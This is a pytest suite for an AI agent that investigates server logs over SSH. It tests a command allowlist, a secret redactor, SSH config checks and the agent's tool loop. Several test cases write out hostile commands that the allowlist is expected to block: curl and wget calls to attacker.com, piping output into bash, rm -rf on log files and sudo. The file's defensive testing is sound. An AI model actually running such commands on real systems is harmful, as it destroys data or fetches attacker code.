import re
from datetime import datetime, timezone
from unittest.mock import MagicMock, patch

import pytest
from langchain_core.messages import AIMessage

from core.agents.specialists.yaml_specialist import YAMLSpecialist
from framework.models import AgentConfig, SSHConfig
from core.graph.state import SpecialistFinding
from core.security.allowlist import CommandAllowlist
from core.security.redactor import Redactor
from core.tools.ssh_tool import SSHExecutionError


# ---------------------------------------------------------------------------
# Fixtures
# ---------------------------------------------------------------------------


@pytest.fixture
def ssh_config():
    return SSHConfig(host="10.0.0.1", username="admin", key_path="/tmp/fake.pem")


@pytest.fixture
def log_agent():
    cfg = AgentConfig(
        agent_type="log",
        description="Investigates container logs.",
        context_commands=[
            "journalctl -n 100 --no-pager",
            "dmesg | tail -50",
            "tail -n 200 /var/log/syslog",
        ],
    )
    return YAMLSpecialist(cfg)


def _make_finding(**kwargs) -> SpecialistFinding:
    defaults = dict(
        agent_type="log",
        subtask_id="task-001",
        findings="## Findings\nAll good.",
        commands_run=["journalctl -n 100 --no-pager"],
        evidence=["Service started normally"],
        confidence=0.8,
        timestamp=datetime.now(timezone.utc),
    )
    defaults.update(kwargs)
    return SpecialistFinding(**defaults)


# ---------------------------------------------------------------------------
# TestCommandAllowlist
# ---------------------------------------------------------------------------


class TestCommandAllowlist:
    def test_allowed_journalctl(self):
        allowed, reason = CommandAllowlist.is_allowed("journalctl -n 100 --no-pager")
        assert allowed is True
        assert reason == ""

    def test_allowed_tail(self):
        allowed, _ = CommandAllowlist.is_allowed("tail -n 200 /var/log/syslog")
        assert allowed is True

    def test_allowed_grep(self):
        allowed, _ = CommandAllowlist.is_allowed("grep -i error /var/log/auth.log")
        assert allowed is True

    def test_allowed_dmesg(self):
        allowed, _ = CommandAllowlist.is_allowed("dmesg | tail -50")
        assert allowed is True

    def test_blocked_rm(self):
        allowed, reason = CommandAllowlist.is_allowed("rm -rf /var/log/old.log")
        assert allowed is False
        assert "Blocked" in reason

    def test_blocked_pipe_bash(self):
        allowed, _ = CommandAllowlist.is_allowed("journalctl -n 10 | bash")
        assert allowed is False

    def test_blocked_redirect(self):
        allowed, _ = CommandAllowlist.is_allowed("journalctl > /tmp/out.txt")
        assert allowed is False

    def test_blocked_sudo(self):
        allowed, _ = CommandAllowlist.is_allowed("sudo journalctl")
        assert allowed is False

    def test_blocked_curl(self):
        allowed, _ = CommandAllowlist.is_allowed("curl http://attacker.com")
        assert allowed is False

    def test_blocked_wget(self):
        allowed, _ = CommandAllowlist.is_allowed("wget http://attacker.com/payload")
        assert allowed is False

    def test_not_in_allowlist(self):
        allowed, reason = CommandAllowlist.is_allowed("python3 exploit.py")
        assert allowed is False
        assert "not in allowlist" in reason

    def test_empty_command(self):
        allowed, reason = CommandAllowlist.is_allowed("")
        assert allowed is False
        assert "Empty" in reason

    def test_deny_before_allow_injection(self):
        # "journalctl" is an allowed prefix, but "| bash" must still block it
        allowed, _ = CommandAllowlist.is_allowed("journalctl -n 100 | bash")
        assert allowed is False


# ---------------------------------------------------------------------------
# TestRedactor
# ---------------------------------------------------------------------------


class TestRedactor:
    def setup_method(self):
        self.redactor = Redactor()

    def test_redacts_password(self):
        text = "2024-01-01 login attempt password=supersecret123 from user admin"
        result = self.redactor.redact(text)
        assert "supersecret123" not in result
        assert "[REDACTED_PASSWORD]" in result

    def test_redacts_aws_key(self):
        text = "Using key AKIAIOSFODNN7EXAMPLE for S3 access"
        result = self.redactor.redact(text)
        assert "AKIAIOSFODNN7EXAMPLE" not in result

    def test_redacts_email(self):
        text = "Auth failure for user john.doe@company.com"
        result = self.redactor.redact(text)
        assert "john.doe@company.com" not in result
        assert "[REDACTED_EMAIL]" in result

    def test_redacts_bearer_token(self):
        text = "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9abcdefgh12345"
        result = self.redactor.redact(text)
        assert "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9abcdefgh12345" not in result

    def test_partial_ip_redaction(self):
        text = "Connection from 192.168.1.100"
        result = self.redactor.redact(text)
        assert "192.168.1.100" not in result
        assert "192.x.x.x" in result

    def test_no_false_positive_on_normal_log(self):
        text = "INFO Service started successfully on port 8080"
        result = self.redactor.redact(text)
        assert "Service started" in result

    def test_extra_patterns_applied(self):
        extra = [(re.compile(r"INTERNAL-SERVICE-\w+"), "[REDACTED_SVC]")]
        r = Redactor(extra_patterns=extra)
        result = r.redact("Connecting to INTERNAL-SERVICE-PAYMENTS")
        assert "[REDACTED_SVC]" in result


# ---------------------------------------------------------------------------
# TestSSHConfig
# ---------------------------------------------------------------------------


class TestSSHConfig:
    def test_valid_key_path(self):
        config = SSHConfig(host="myhost", username="admin", key_path="/path/to/key")
        assert config.host == "myhost"
        assert config.port == 22

    def test_valid_password(self):
        config = SSHConfig(host="myhost", username="admin", password="secret")
        assert config.password == "secret"

    def test_no_auth_raises(self):
        with pytest.raises(ValueError, match="key_path or password"):
            SSHConfig(host="myhost", username="admin")

    def test_port_zero_raises(self):
        with pytest.raises(ValueError):
            SSHConfig(host="h", username="u", password="p", port=0)

    def test_password_not_in_repr(self):
        config = SSHConfig(host="h", username="u", password="secretpass")
        assert "secretpass" not in repr(config)


# ---------------------------------------------------------------------------
# TestLogAgent (via YAMLSpecialist)
# ---------------------------------------------------------------------------


class TestLogAgent:
    def test_agent_type(self, log_agent):
        assert log_agent.agent_type == "log"

    def test_context_commands_not_empty(self, log_agent):
        assert len(log_agent.context_commands) > 0

    def test_context_commands_all_allowed(self, log_agent):
        for cmd in log_agent.context_commands:
            allowed, reason = CommandAllowlist.is_allowed(cmd)
            assert allowed, f"Context command blocked: {cmd!r} -- {reason}"

    @patch("core.agents.specialists.base_specialist.SSHExecutor")
    @patch("core.agents.specialists.base_specialist.create_agent")
    def test_run_returns_finding(self, mock_create_agent, mock_executor_cls, log_agent, ssh_config):
        mock_executor = MagicMock()
        mock_executor.execute.return_value = "Jan 01 00:00:00 myhost kernel: normal boot"
        mock_executor_cls.return_value = mock_executor

        final_content = (
            "CONFIDENCE: 0.75\n"
            "EVIDENCE:\n"
            "- kernel: normal boot at Jan 01 00:00:00\n"
            "SUMMARY:\n"
            "## Log Analysis\nNo errors found.\n"
        )
        mock_agent = MagicMock()
        mock_agent.invoke.return_value = {"messages": [AIMessage(content=final_content)]}
        mock_create_agent.return_value = mock_agent

        finding = log_agent.run(
            subtask_id="task-001",
            subtask_description="Check for OOM events",
            ssh_config=ssh_config,
            service_context={"service": "myapp"},
        )

        assert isinstance(finding, SpecialistFinding)
        assert finding.agent_type == "log"
        assert finding.subtask_id == "task-001"
        assert finding.confidence == 0.75
        assert "No errors found" in finding.findings
        assert len(finding.evidence) > 0
        mock_executor.close_all.assert_called_once()

    @patch("core.agents.specialists.base_specialist.SSHExecutor")
    @patch("core.agents.specialists.base_specialist.create_agent")
    def test_tool_loop_blocks_dangerous_command(
        self, mock_create_agent, mock_executor_cls, log_agent, ssh_config
    ):
        mock_executor = MagicMock()
        mock_executor.execute.return_value = "log data"
        mock_executor_cls.return_value = mock_executor

        messages_with_tool_call = [
            AIMessage(
                content="",
                tool_calls=[{"id": "tc1", "name": "run_command", "args": {"command": "rm -rf /var/log/app.log"}}],
            ),
            AIMessage(
                content="CONFIDENCE: 0.4\nEVIDENCE:\n- No useful logs\nSUMMARY:\nCommand was blocked.\n"
            ),
        ]
        mock_agent = MagicMock()
        mock_agent.invoke.return_value = {"messages": messages_with_tool_call}
        mock_create_agent.return_value = mock_agent

        finding = log_agent.run("task-002", "Investigate errors", ssh_config, {})

        assert "rm -rf /var/log/app.log" in finding.commands_run

        for call_args in mock_executor.execute.call_args_list:
            assert "rm -rf" not in call_args[0][1]

    @patch("core.agents.specialists.base_specialist.SSHExecutor")
    @patch("core.agents.specialists.base_specialist.create_agent")
    def test_tool_loop_max_iterations(
        self, mock_create_agent, mock_executor_cls, log_agent, ssh_config
    ):
        mock_executor = MagicMock()
        mock_executor.execute.return_value = "some output"
        mock_executor_cls.return_value = mock_executor

        tool_call_msg = AIMessage(
            content="",
            tool_calls=[{"id": "tc0", "name": "run_command", "args": {"command": "journalctl -n 10"}}],
        )
        final_msg = AIMessage(
            content="CONFIDENCE: 0.5\nEVIDENCE:\n- hit limit\nSUMMARY:\nMax iterations reached.\n"
        )
        messages = [tool_call_msg] * 10 + [final_msg]
        mock_agent = MagicMock()
        mock_agent.invoke.return_value = {"messages": messages}
        mock_create_agent.return_value = mock_agent

        finding = log_agent.run("task-003", "Long investigation", ssh_config, {})

        assert isinstance(finding, SpecialistFinding)
        assert len(finding.commands_run) == 10

    @patch("core.agents.specialists.base_specialist.SSHExecutor")
    @patch("core.agents.specialists.base_specialist.create_agent")
    def test_ssh_error_mid_loop(
        self, mock_create_agent, mock_executor_cls, log_agent, ssh_config
    ):
        mock_executor = MagicMock()
        mock_executor.execute.side_effect = [
            "context output 1",
            "context output 2",
            "context output 3",
            SSHExecutionError("Connection lost", "grep error /var/log/app.log", "10.0.0.1"),
        ]
        mock_executor_cls.return_value = mock_executor

        messages_with_tool_call = [
            AIMessage(
                content="",
                tool_calls=[{"id": "tc1", "name": "run_command", "args": {"command": "grep error /var/log/app.log"}}],
            ),
            AIMessage(
                content="CONFIDENCE: 0.3\nEVIDENCE:\n- SSH error encountered\nSUMMARY:\nSSH failed.\n"
            ),
        ]
        mock_agent = MagicMock()
        mock_agent.invoke.return_value = {"messages": messages_with_tool_call}
        mock_create_agent.return_value = mock_agent

        finding = log_agent.run("task-004", "Check app errors", ssh_config, {})
        assert finding.confidence == 0.3

    def test_parse_finding_defaults_on_malformed_response(self, log_agent):
        malformed = "The logs look normal. Nothing unusual was observed."
        finding = log_agent._parse_finding(malformed, "task-005", ["journalctl -n 10"])
        assert finding.confidence == 0.5
        assert finding.findings == malformed
        assert finding.evidence == []
        assert finding.commands_run == ["journalctl -n 10"]
